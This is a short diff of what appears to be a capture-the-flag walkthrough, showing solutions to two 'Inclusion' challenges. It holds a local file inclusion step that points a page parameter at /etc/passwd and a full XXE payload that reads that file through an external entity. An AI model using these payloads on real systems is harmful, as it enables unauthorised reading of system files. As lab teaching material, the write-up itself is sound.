@@ -13,7 +13,7 @@ Look at the robots.txt file
 Change the ```?page=welcome.php``` to ```/etc/passwd```
 
 ### Inclusion 102
-This is an XXE, check the source code, then catch the request in burp, modify the body in the repeater for something like this:
+This is an XXE, check the source code, then catch the request in burp, modify the body in the repeater for something like this:<br>
 ```<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY ext SYSTEM "file:///etc/passwd" >]><function><getConversation>&ext;</getConversation></function>```
 
 (thanks lolkatz)
